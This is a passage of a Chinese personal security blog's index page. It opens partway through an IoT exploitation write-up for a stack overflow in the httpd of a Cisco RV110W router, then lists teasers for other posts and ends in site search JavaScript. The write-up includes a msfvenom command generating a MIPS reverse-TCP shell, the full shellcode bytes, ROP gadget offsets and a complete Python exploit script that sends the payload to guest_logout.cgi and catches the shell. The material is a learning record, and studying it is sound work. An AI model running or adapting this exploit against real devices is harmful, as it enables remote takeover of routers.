0x75616161 (<span class="string">&#x27;aaau&#x27;</span>)</span><br><span class="line">*S8   0x76616161 (<span class="string">&#x27;aaav&#x27;</span>)</span><br><span class="line">*FP   0x7fa20458 ◂— <span class="string">&#x27;aaaxaaayaaa&#x27;</span></span><br><span class="line">*SP   0x7fa20458 ◂— <span class="string">&#x27;aaaxaaayaaa&#x27;</span></span><br><span class="line">*PC   0x77616161 (<span class="string">&#x27;aaaw&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>使用<code>pwntools</code>的cyclic_find函数，得到溢出长度为85</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ssr@ubuntu:~/iot/rv110w$ python</span><br><span class="line">Python 2.7.12 (default, Oct  5 2020, 13:56:01) </span><br><span class="line">[GCC 5.4.0 20160609] on linux2</span><br><span class="line">Type <span class="string">&quot;help&quot;</span>, <span class="string">&quot;copyright&quot;</span>, <span class="string">&quot;credits&quot;</span> or <span class="string">&quot;license&quot;</span> <span class="keyword">for</span> more information.</span><br><span class="line">&gt;&gt;&gt; from pwn import *</span><br><span class="line">&gt;&gt;&gt; cyclic_find(<span class="string">&quot;aaaw&quot;</span>)</span><br><span class="line">85</span><br></pre></td></tr></table></figure>

<h4 id="空字节绕过"><a href="#空字节绕过" class="headerlink" title="空字节绕过"></a>空字节绕过</h4><p>由于溢出点是sscanf，若payload中有NULL字节则会被截断，所以需要绕过00.</p>
<p>用IDA的mipsrop插件查看httpd本身的gadget，可以发现程序地址本身包含00，无法调用，且程序没有开启PIE，无法满足要求</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Python&gt;mipsrop.stackfinder()</span><br><span class="line">----------------------------------------------------------------------------------------------------------------</span><br><span class="line">|  Address     |  Action                                              |  Control Jump                          |</span><br><span class="line">----------------------------------------------------------------------------------------------------------------</span><br><span class="line">|  0x00409A14  |  addiu <span class="variable">$v1</span>,<span class="variable">$sp</span>,0x178+var_158                         |  jalr  <span class="variable">$s2</span>                             |</span><br><span class="line">|  0x00409A44  |  addiu <span class="variable">$s0</span>,<span class="variable">$sp</span>,0x178+var_64                          |  jalr  <span class="variable">$s2</span> </span><br></pre></td></tr></table></figure>

<p>考虑使用动态库中的gadget。在这一设备中，相同的二进制程序启动的libc基址是相同的，对于httpd，libc的基址为<code>0x2af98000</code>,可以使用该库内的gadget</p>
<p>对于shellcode，这里使用<code>msfvenom</code>生成，具体方法为</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/mipsle/shell_reverse_tcp  LHOST=192.168.1.100 LPORT=8888 --arch mipsle --platform linux -f py -o shellcode.py </span><br></pre></td></tr></table></figure>

<p>生成的shellcode内容如下，不带00且满足要求</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">buf =  <span class="string">b&quot;&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xfa\xff\x0f\x24\x27\x78\xe0\x01\xfd\xff\xe4\x21\xfd&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xff\xe5\x21\xff\xff\x06\x28\x57\x10\x02\x24\x0c\x01&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x01\x01\xff\xff\xa2\xaf\xff\xff\xa4\x8f\xfd\xff\x0f&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x34\x27\x78\xe0\x01\xe2\xff\xaf\xaf\x22\xb8\x0e\x3c&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x22\xb8\xce\x35\xe4\xff\xae\xaf\x01\x64\x0e\x3c\xc0&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xa8\xce\x35\xe6\xff\xae\xaf\xe2\xff\xa5\x27\xef\xff&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x0c\x24\x27\x30\x80\x01\x4a\x10\x02\x24\x0c\x01\x01&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x01\xfd\xff\x11\x24\x27\x88\x20\x02\xff\xff\xa4\x8f&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x21\x28\x20\x02\xdf\x0f\x02\x24\x0c\x01\x01\x01\xff&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xff\x10\x24\xff\xff\x31\x22\xfa\xff\x30\x16\xff\xff&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x06\x28\x62\x69\x0f\x3c\x2f\x2f\xef\x35\xec\xff\xaf&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xaf\x73\x68\x0e\x3c\x6e\x2f\xce\x35\xf0\xff\xae\xaf&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xf4\xff\xa0\xaf\xec\xff\xa4\x27\xf8\xff\xa4\xaf\xfc&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xff\xa0\xaf\xf8\xff\xa5\x27\xab\x0f\x02\x24\x0c\x01&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x01\x01&quot;</span></span><br></pre></td></tr></table></figure>

<p>接下来使用ret2libc方法构建rop，lic库文件为<code>libc.so.0</code>，使用mipsrop可找到gadget，共有32gadget，这里使用一个跳转到s3的gadget，找到对应的间接跳转到a0的寄存器。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">|  0x00025CAC  |  addiu <span class="variable">$a0</span>,<span class="variable">$sp</span>,0x38+var_20                           |  jalr  <span class="variable">$s3</span> </span><br><span class="line">|  0x0003D050  |  move <span class="variable">$t9</span>,<span class="variable">$a0</span>                                        |  jalr  <span class="variable">$a0</span> </span><br></pre></td></tr></table></figure>

<p>原本是准备使用一个跳转到s0的gadget，但发现其虽然在mipsrop找出来符合修改a0的条件，但跳转到该位置才发现不符合，故换了一个gadget</p>
<p>之前已找到控制ra的偏移值为85，可以在IDA中查看函数段的末尾，可以发现控制s3的偏移值为24，最终完成的脚本如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests,thread</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;mips&#x27;</span>,endian=<span class="string">&#x27;little&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#开启监听线程</span></span><br><span class="line">io = listen(<span class="number">8888</span>)</span><br><span class="line"><span class="comment">#libc基址和gadget地址</span></span><br><span class="line">url=<span class="string">&quot;https://192.168.1.1/guest_logout.cgi&quot;</span></span><br><span class="line">libc = <span class="number">0x2af98000</span></span><br><span class="line">jar_a0=<span class="number">0x0003D050</span>+libc   <span class="comment">#move $t9,$a0 </span></span><br><span class="line">jar_s3=<span class="number">0x00025CAC</span>+libc   <span class="comment">#addiu $a0,$sp,0x38+var_10  </span></span><br><span class="line"><span class="comment">#shellcode</span></span><br><span class="line">buf =  <span class="string">b&quot;&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xfa\xff\x0f\x24\x27\x78\xe0\x01\xfd\xff\xe4\x21\xfd&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xff\xe5\x21\xff\xff\x06\x28\x57\x10\x02\x24\x0c\x01&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x01\x01\xff\xff\xa2\xaf\xff\xff\xa4\x8f\xfd\xff\x0f&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x34\x27\x78\xe0\x01\xe2\xff\xaf\xaf\x22\xb8\x0e\x3c&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x22\xb8\xce\x35\xe4\xff\xae\xaf\x01\x64\x0e\x3c\xc0&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xa8\xce\x35\xe6\xff\xae\xaf\xe2\xff\xa5\x27\xef\xff&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x0c\x24\x27\x30\x80\x01\x4a\x10\x02\x24\x0c\x01\x01&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x01\xfd\xff\x11\x24\x27\x88\x20\x02\xff\xff\xa4\x8f&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x21\x28\x20\x02\xdf\x0f\x02\x24\x0c\x01\x01\x01\xff&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xff\x10\x24\xff\xff\x31\x22\xfa\xff\x30\x16\xff\xff&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x06\x28\x62\x69\x0f\x3c\x2f\x2f\xef\x35\xec\xff\xaf&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xaf\x73\x68\x0e\x3c\x6e\x2f\xce\x35\xf0\xff\xae\xaf&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xf4\xff\xa0\xaf\xec\xff\xa4\x27\xf8\xff\xa4\xaf\xfc&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xff\xa0\xaf\xf8\xff\xa5\x27\xab\x0f\x02\x24\x0c\x01&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x01\x01&quot;</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">&quot;status_guestnet.asp&quot;</span>+<span class="string">&#x27;a&#x27;</span>*<span class="number">61</span>+p32(jar_a0)+<span class="string">&#x27;a&#x27;</span>*<span class="number">20</span>+p32(jar_s3)+<span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span>+buf</span><br><span class="line">payload = &#123;<span class="string">&quot;cmac&quot;</span>:<span class="string">&quot;12:af:aa:bb:cc:dd&quot;</span>,<span class="string">&quot;submit_button&quot;</span>:payload,<span class="string">&quot;cip&quot;</span>:<span class="string">&quot;192.168.1.100&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">attack</span>():</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        requests.post(url, data=payload, verify=<span class="literal">False</span>, timeout=<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    </span><br><span class="line">thread.start_new_thread(attack,())</span><br><span class="line">io.wait_for_connection()</span><br><span class="line">log.success(<span class="string">&quot;getshell&quot;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="获取shell后的操作"><a href="#获取shell后的操作" class="headerlink" title="获取shell后的操作"></a>获取shell后的操作</h3>
          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://example.com/2020/11/23/PWN-MIPS-mpwn/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="青晷">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/11/23/PWN-MIPS-mpwn/" itemprop="url">PWN-MIPS-mpwn</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-11-23T21:16:11+08:00">
                2020-11-23
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          <p><strong>同样是MIPS架构pwn的入门题（误），尝试做做，看来我离入门还有很长的路要走</strong></p>
          <!--noindex-->
          <div class="post-button text-center">
            <a class="btn" href="/2020/11/23/PWN-MIPS-mpwn/#more" rel="contents">
              阅读全文 &raquo;
            </a>
          </div>
          <!--/noindex-->
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://example.com/2020/11/21/Pwn-MIPS-Mplogin/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="青晷">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/11/21/Pwn-MIPS-Mplogin/" itemprop="url">Pwn-MIPS-Mplogin</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-11-21T11:40:02+08:00">
                2020-11-21
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          <p><strong>从MIPS入手IOT逆向，先学习一两道题热身，思路主要来源是学长的博客，记录下写题的过程，系统是Ubuntu16.04</strong></p>
          <!--noindex-->
          <div class="post-button text-center">
            <a class="btn" href="/2020/11/21/Pwn-MIPS-Mplogin/#more" rel="contents">
              阅读全文 &raquo;
            </a>
          </div>
          <!--/noindex-->
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://example.com/2020/11/19/python-selenium%E7%88%AC%E5%8F%96%E6%BC%AB%E7%94%BB/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="青晷">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/11/19/python-selenium%E7%88%AC%E5%8F%96%E6%BC%AB%E7%94%BB/" itemprop="url">python-selenium爬取漫画</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-11-19T20:39:09+08:00">
                2020-11-19
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          <p><img src="/2020/11/19/python-selenium%E7%88%AC%E5%8F%96%E6%BC%AB%E7%94%BB/9.jpg" alt="9"></p>
<p>想看化物语漫画，找到一家<a target="_blank" rel="noopener" href="http://manhua.kukudm.com/comiclist/2372/">网站</a>开始爬取，就当练习爬虫。使用python的selenium框架。</p>
          <!--noindex-->
          <div class="post-button text-center">
            <a class="btn" href="/2020/11/19/python-selenium%E7%88%AC%E5%8F%96%E6%BC%AB%E7%94%BB/#more" rel="contents">
              阅读全文 &raquo;
            </a>
          </div>
          <!--/noindex-->
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://example.com/2020/11/19/pwn%E6%A0%88%E6%BA%A2%E5%87%BA%E7%9A%84%E9%A6%96%E6%AC%A1%E5%B0%9D%E8%AF%95/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="青晷">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/11/19/pwn%E6%A0%88%E6%BA%A2%E5%87%BA%E7%9A%84%E9%A6%96%E6%AC%A1%E5%B0%9D%E8%AF%95/" itemprop="url">pwn栈溢出的首次尝试和基本ROP</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-11-19T15:39:04+08:00">
                2020-11-19
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          <p><strong>模仿ctfwiki上实例进行首次pwn以及基本ROP的学习</strong></p>
          <!--noindex-->
          <div class="post-button text-center">
            <a class="btn" href="/2020/11/19/pwn%E6%A0%88%E6%BA%A2%E5%87%BA%E7%9A%84%E9%A6%96%E6%AC%A1%E5%B0%9D%E8%AF%95/#more" rel="contents">
              阅读全文 &raquo;
            </a>
          </div>
          <!--/noindex-->
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://example.com/2020/11/19/MIPS-%E5%85%A5%E9%97%A8/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="青晷">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/11/19/MIPS-%E5%85%A5%E9%97%A8/" itemprop="url">MIPS-入门</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-11-19T13:21:53+08:00">
                2020-11-19
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          <p><strong>要学习IOT逆向，准备入手的思科路由器是MIPS架构，在开始动手前先熟悉一下MIPS相关基础</strong></p>
          <!--noindex-->
          <div class="post-button text-center">
            <a class="btn" href="/2020/11/19/MIPS-%E5%85%A5%E9%97%A8/#more" rel="contents">
              阅读全文 &raquo;
            </a>
          </div>
          <!--/noindex-->
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://example.com/2020/11/19/%E7%94%B1%E6%AD%A4%E5%BC%80%E5%A7%8B/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="青晷">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/11/19/%E7%94%B1%E6%AD%A4%E5%BC%80%E5%A7%8B/" itemprop="url">由此开始</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-11-19T13:10:22+08:00">
                2020-11-19
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>记于2020年11月19日，晴</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
  </section>

  


          </div>
          


          

        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      

      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <img class="site-author-image" itemprop="image"
                src="/images/avatar.jpg"
                alt="" />
            
              <p class="site-author-name" itemprop="name"></p>
              <p class="site-description motion-element" itemprop="description"></p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives/%7C%7Carchive">
              
                  <span class="site-state-item-count">17</span>
                  <span class="site-state-item-name">日志</span>
                </a>
              </div>
            

            

            

          </nav>

          

          

          
          

          
          

          

        </div>
      </section>

      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2021</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">John Doe</span>

  
</div>


  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>




        
<div class="busuanzi-count">
  <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>

  
    <span class="site-uv">
      <i class="fa fa-user"></i>
      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
      
    </span>
  

  
    <span class="site-pv">
      <i class="fa fa-eye"></i>
      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
      
    </span>
  
</div>








        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  












  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  


  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>



  

  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  












  

  <script type="text/javascript">
    // Popup Window;
    var isfetched = false;
    var isXml = true;
    // Search DB path;
    var search_path = "./public/search.xml";
    if (search_path.length === 0) {
      search_path = "search.xml";
    } else if (/json$/i.test(search_path)) {
      isXml = false;
    }
    var path = "/" + search_path;
    // monitor main search box;

    var onPopupClose = function (e) {
      $('.popup').hide();
      $('#local-search-input').val('');
      $('.search-result-list').remove();
      $('#no-result').remove();
      $(".local-search-pop-overlay").remove();
      $('body').css('overflow', '');
    }

    function proceedsearch() {
      $("body")
        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
        .css('overflow', 'hidden');
      $('.search-popup-overlay').click(onPopupClose);
      $('.popup').toggle();
      var $localSearchInput = $('#local-search-input');
      $localSearchInput.attr("autocapitalize", "none");
      $localSearchInput.attr("autocorrect", "off");
      $localSearchInput.focus();
    }

    // search function;
    var searchFunc = function(path, search_id, content_id) {
      'use strict';

      // start loading animation
      $("body")
        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
          '<div id="search-loading-icon">' +
          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
          '</div>' +
          '</div>')
        .css('overflow', 'hidden');
      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');

      $.ajax({
        url: path,
        dataType: isXml ? "xml" : "json",
        async: true,
        success: function(res) {
          // get the contents from search data
          isfetched = true;
          $('.popup').detach().appendTo('.header-inner');
          var datas = isXml ? $("entry", res).map(function() {
            return {
              title: $("title", this).text(),
              content: $("content",this).text(),
              url: $("url" , this).text()
            };
          }).get() : res;
          var input = document.getElementById(search_id);
          var resultContent = document.getElementById(content_id);
          var inputEventFunction = function() {
            var searchText = input.value.trim().toLowerCase();
            var keywords = searchText.split(/[\s\-]+/);
            if (keywords.length > 1) {
              keywords.push(searchText);
            }
            var resultItems = [];
            if (searchText.length > 0) {
              // perform local searching
              datas.forEach(function(data) {
                var isMatch = false;
                var hitCount = 0;
                var searchTextCount = 0;
                var title = data.title.trim();
                var titleInLowerCase = title.toLowerCase();
                var content = data.content.trim().replace(/<[^>]+>/g,"");
                var contentInLowerCase = content.toLowerCase();
                var articleUrl = decodeURIComponent(data.url);
                var indexOfTitle = [];
                var indexOfContent = [];
                // only match articles with not empty titles
                if(title != '') {
                  keywords.forEach(function(keyword) {
                    function getIndexByWord(word, text, caseSensitive) {
                      var wordLen = word.length;
                      if (wordLen === 0) {
                        return [];
                      }
                      var startPosition = 0, position = [], index = [];
                      if (!caseSensitive) {
                        text = text.toLowerCase();
                        word = word.toLowerCase();
                      }
                      while ((position = text.indexOf(word, startPosition)) > -1) {
                        index.push({position: position, word: word});
                        startPosition = position + wordLen;
                      }
                      return index;
                    }

                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
                  });
                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
                    isMatch = true;
                    hitCount = indexOfTitle.length + indexOfContent.length;
                  }
                }

                // show search results

                if (isMatch) {
                  // sort index by position of keyword

                  [indexOfTitle, indexOfContent].forEach(function (index) {
                    index.sort(function (itemLeft, itemRight) {
                      if (itemRight.position !== itemLeft.position) {
                        return itemRight.position - itemLeft.position;
                      } else {
                        return itemLeft.word.length - itemRight.word.length;
                      }
                    });
                  });

                  // merge hits into slices

                  function mergeIntoSlice(text, start, end, index) {
                    var item = index[index.length - 1];
                    var position = item.position;
                    var word = item.word;
                    var hits = [];
                    var searchTextCountInSlice = 0;
                    while (position + word.length <= end && index.length != 0) {
                      if (word === searchText) {
                        searchTextCountInSlice++;
                      }
                      hits.push({position: position, length: word.length});
                      var wordEnd = position + word.length;

